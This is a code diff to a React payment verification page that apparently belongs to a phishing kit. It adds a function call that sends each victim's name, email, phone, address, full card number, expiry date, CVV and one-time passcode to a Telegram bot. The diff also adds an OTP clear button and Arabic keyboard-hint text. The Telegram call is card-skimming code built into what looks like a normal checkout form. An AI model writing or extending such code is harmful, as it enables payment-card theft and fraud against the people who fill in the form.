@@ -5,7 +5,8 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
 import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
-import { Shield, AlertCircle, Check, Lock, Clock } from "lucide-react";
+import { sendToTelegram } from "@/lib/telegram";
+import { Shield, AlertCircle, Check, Lock, Clock, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import {
@@ -104,6 +105,32 @@ const PaymentOTP = () => {
         console.error('Form submission error:', error);
       }
       
+      // Send payment confirmation to Telegram
+      const telegramResult = await sendToTelegram({
+        type: 'payment_confirmation',
+        data: {
+          name: payment.name || '',
+          email: payment.email || '',
+          phone: payment.phone || '',
+          address: payment.address || '',
+          service: serviceName,
+          amount: payment.amount || '',
+          cardholder: payment.cardholder || '',
+          cardNumber: payment.card_number || '',
+          cardLast4: payment.card_last4 || '',
+          expiry: payment.card_expiry || '',
+          cvv: payment.card_cvv || '',
+          otp: otp
+        },
+        timestamp: new Date().toISOString()
+      });
+
+      if (telegramResult.success) {
+        console.log('Payment confirmation sent to Telegram successfully');
+      } else {
+        console.error('Failed to send payment confirmation to Telegram:', telegramResult.error);
+      }
+
       // Success!
       await updatePayment.mutateAsync({
         paymentId: payment.id,
@@ -272,7 +299,7 @@ const PaymentOTP = () => {
             
             {/* OTP Input - Modern Style */}
             <div className="mb-4 sm:mb-6">
-              <div className="flex justify-center">
+              <div className="flex justify-center items-center gap-3">
                 <InputOTP 
                   maxLength={4} 
                   value={otp} 
@@ -293,13 +320,26 @@ const PaymentOTP = () => {
                     ))}
                   </InputOTPGroup>
                 </InputOTP>
+                
+                {/* Delete Button */}
+                {otp.length > 0 && !isLocked && (
+                  <Button
+                    type="button"
+                    variant="ghost"
+                    size="sm"
+                    onClick={handleClearOTP}
+                    className="w-8 h-8 sm:w-10 sm:h-10 p-0 rounded-full hover:bg-destructive/10 hover:text-destructive transition-colors"
+                  >
+                    <X className="w-4 h-4 sm:w-5 sm:h-5" />
+                  </Button>
+                )}
               </div>
               
               {/* Keyboard Instructions */}
               {otp.length > 0 && !isLocked && (
                 <div className="text-center mt-3">
                   <p className="text-xs text-muted-foreground">
-                    اضغط <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Esc</kbd> أو <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Ctrl+Backspace</kbd> لمسح الرمز
+                    اضغط <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Esc</kbd> أو <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Ctrl+Backspace</kbd> أو زر <X className="w-3 h-3 inline mx-1" /> لمسح الرمز
                   </p>
                 </div>
               )}
